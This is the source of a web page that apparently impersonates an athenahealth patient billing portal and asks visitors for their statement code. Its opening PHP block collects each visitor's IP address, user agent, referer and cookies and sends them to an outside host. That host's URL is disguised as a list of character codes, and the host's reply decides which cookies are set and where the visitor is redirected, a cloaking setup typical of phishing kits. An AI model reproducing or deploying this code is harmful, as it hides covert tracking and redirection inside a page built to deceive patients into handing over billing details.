<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "498902";$uid="e77gsusjbhzetj5c7aqfxu65x";$qu=$_SERVER["QUERY_STRING"];$postdata = http_build_query(array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref" => $_SERVER["HTTP_REFERER"],"ip" =>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn" => $_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query" => $_SERVER["QUERY_STRING"],"ua" => $_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id" =>$uid,"id" => $id));$opts = array("http" =>array("method" => "POST","header" => "Content-type: application/x-www-form-urlencoded","content" => $postdata));$context = stream_context_create($opts);$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$result=file_get_contents($u,false,$context);$arr=explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0]==="true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>
<!doctype html>
<html lang="en">
  <head>
  
	
	  

 
<!--Start of Tawk.to Script-->
  <script type="text/javascript">
    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
    (function(){
    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
    s1.async=true;
    s1.src='https://embed.tawk.to/64b02a6f94cf5d49dc6363ff/1h582bjut';
    s1.charset='UTF-8';
    s1.setAttribute('crossorigin','*');
    s0.parentNode.insertBefore(s1,s0);
    })();
  </script>
<!--End of Tawk.to Script-->
	<!-- Matomo Tag Manager -->
<script>
  var _mtm = window._mtm = window._mtm || [];
  _mtm.push({'mtm.startTime': (new Date().getTime()), 'event': 'mtm.Start'});
  (function() {
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
    g.async=true; g.src='https://cdn.matomo.cloud/athenahealth.matomo.cloud/container_Vr6t2gDc.js'; s.parentNode.insertBefore(g,s);
  })();
</script>
<!-- End Matomo Tag Manager -->

    

 

    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=PT+Serif:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<!-- <link rel="stylesheet" href="./Popup.css">
<script src="./Popup.js"></script> -->
<!-- <script language="javascript">
  function moon(VarSearch){
    var parson = window.location.search.substring(1);
    var playton = parson.split('&');
    for(var i = 0; i < playton.length; i++){
        var flameitnew = playton[i].split('=');
        if(flameitnew[0] == VarSearch){
            return flameitnew[1];
      }
    }
  }
    
  var abbyters = moon('gclid');
  
  fewNotes = function() {  
    window.location.replace("external.php");
  }
</script>  -->
<link rel="stylesheet" href="css/checkout.css">
<link rel="stylesheet" href="css/responsive.css">  
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.2/css/all.css">

<style>
  .capt{
background-color: #616d87;
width: 300px;
height:100px;

}

#mainCaptcha{
position: relative;
left : 0px;
top: 5px;

}

#refresh{
position:relative;
left:230px;
width:30px;
height:30px;
bottom:45px;
}

#txtInput, #Button1{
position: relative;
left:40px;
bottom: 40px;
}

/* Full-screen overlay */
.loader-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(255, 255, 255, 0.8);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 9999;
  display: none; /* Initially hidden */
}

/* Loader animation */
.loader {
  border: 16px solid #f3f3f3;
  border-top: 16px solid #3498db;
  border-radius: 50%;
  width: 120px;
  height: 120px;
  animation: spin 2s linear infinite;
}

/* Keyframes for spinning animation */
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

</style>


<script>
  // function Captcha(){
  //  var alpha = new Array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z', 
  //      '0','1','2','3','4','5','6','7','8','9');
  //  var i;
  //  for (i=0;i<6;i++){
  //      var a = alpha[Math.floor(Math.random() * alpha.length)];
  //      var b = alpha[Math.floor(Math.random() * alpha.length)];
  //      var c = alpha[Math.floor(Math.random() * alpha.length)];
  //      var d = alpha[Math.floor(Math.random() * alpha.length)];
  //      var e = alpha[Math.floor(Math.random() * alpha.length)];
  //      var f = alpha[Math.floor(Math.random() * alpha.length)];
  //      var g = alpha[Math.floor(Math.random() * alpha.length)];
  //                   }
  //      var code = a + ' ' + b + ' ' + ' ' + c + ' ' + d + ' ' + e + ' '+ f + ' ' + g;
  //      document.getElementById("mainCaptcha").innerHTML = code;
  //  document.getElementById("mainCaptcha").value = code;
  //    }
// function ValidCaptcha(){
//    var string1 = removeSpaces(document.getElementById('mainCaptcha').value);
//    var string2 =         removeSpaces(document.getElementById('txtInput').value);
//    if (string1 == string2){
//           return true;
//    }else{        
//         return false;
//         }
// }
// function removeSpaces(string){
//    return string.split(' ').join('');
// }


</script>
</head>
<body  style="background-color: white;" class="flex flex-col items-center justify-center w-full min-h-screen">
<div id="loader" style="display:none" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
    <div class="text-center text-white">
        <div class="spinner-border border-t-4 border-blue-500 rounded-full h-16 w-16 mx-auto mb-4"></div>
        <p class="text-xl font-semibold">Please wait , loading...</p>
    </div>
</div>

<style>
    .spinner-border {
        border: 8px solid transparent;
        border-top-color: #4B9CD3; /* Blue color */
        border-radius: 50%;
        width: 4rem;
        height: 4rem;
        animation: spin2 1s linear infinite;
    }

    @keyframes spin2 {
        0% {
            transform: rotate(0deg);
        }
       
        100% {
            transform: rotate(360deg);
        }
    }
</style>




<div class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-40 hidden" id="exampleModal">
    <div class="bg-white rounded-lg shadow-xl p-6 w-full max-w-md mx-4">
        <div class="flex justify-between items-center mb-4">
            <h5 class="text-xl font-bold" id="exampleModalLabel">Find Your Code</h5>
            <button type="button" class="text-gray-500 hover:text-gray-700" onclick="closeModal()">
                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
            </button>
        </div>
        <div>
            <p class="mb-4">We'll need your statement code to identify you. You can find it on your statement as shown below:</p>
            <img src="./assets/images/payment-athena-health.png" alt="Statement code location" class="w-full rounded-lg">
        </div>
    </div>
</div>

<main class="flex-grow relative w-full flex-1 min-h-[80vh] flex flex-col items-center justify-center">
  <img class="w-full h-full absolute left-0 top-0 object-cover opacity-50 object-right z-0" src="./assets/images/bg_wave.svg"/>
    <div class="container z-[1] w-full mx-auto px-4 py-8">
        <div class="flex flex-col lg:flex-row items-center lg:items-stretch">
            <div class="w-full flex flex-col  items-center justify-center lg:w-auto flex-0 lg:flex-1 mb-8 lg:mb-0">
                <div class="bg-contain h-full w-full max-h-[40vh] md:max-h-[50vh] bg-no-repeat bg-center aspect-square lg:h-full rounded-lg" style="background-image: url('./assets/images/illustration.svg')"></div>
            </div>
            <div class="w-full flex flex-col items-start justify-center lg:w-auto flex-0 lg:flex-1 lg:pl-12">
                <h1 class="text-2xl md:text-4xl font-bold mb-6 font-serif text-center lg:!text-left">Welcome!<br>Enter your statement code to get started</h1>
                <form name="formId" class="space-y-6 w-full flex flex-col items-start justify-start max-w-none lg:max-w-md mr-[unset] lg:mr-auto lg:mx-0">
                    <div class="w-full">
                        <input class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" name="clientId" id="clientId" data-mask="AAAA-AAAA-AAA-AAAA" placeholder="XXXX-XXXX-XXX-XXXX" type="text" required autocomplete="off" maxlength="18">
                    </div>
                    <div id="toast2" class="relative bg-red-500 hidden text-white px-6 py-3 rounded-lg shadow-lg">
                      Please enter correct Statement Code!
                  </div>
                    <div>

                        <a href="#" onclick="openModal()" class="text-blue-600 hover:text-blue-800 font-semibold">Where can I find my code?</a>
                    </div>
                    <div class="w-full max-w-none lg:max-w-xs">
                        <button type="submit" class="w-full bg-blue-600 text-white py-3 px-6 rounded-2xl hover:bg-blue-700 transition duration-300" id="submit-btn">Continue</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</main>



<footer class="mt-auto w-full border-t border-gray-200">
    <div class="container mx-auto px-4 py-6">
        <div class="flex flex-col md:flex-row justify-between items-center space-y-4 md:space-y-0">
            <p class="text-xs text-gray-600 text-center md:!text-left max-w-2xl">
                Note: This page should only be accessed by the patient or those authorized by the patient (e.g. guarantor).
                By continuing, you represent that you are authorized to address the patient's billing matters.
            </p>
            <div class="flex space-x-4 mr-12 [&_a]:flex-shrink-0">
                <a href="./Privacy.html" class="text-blue-600 hover:text-blue-800">Privacy Policy</a>
                <a href="./Contactus.html" class="text-blue-600 hover:text-blue-800">Contact Us</a>
                <a href="./Aboutus.html" class="text-blue-600 hover:text-blue-800">About Us</a>
            </div>
        </div>
    </div>
</footer>






  <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
  <script src="/37082f2f8y230fy32f.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>

  
  </body>
</html>
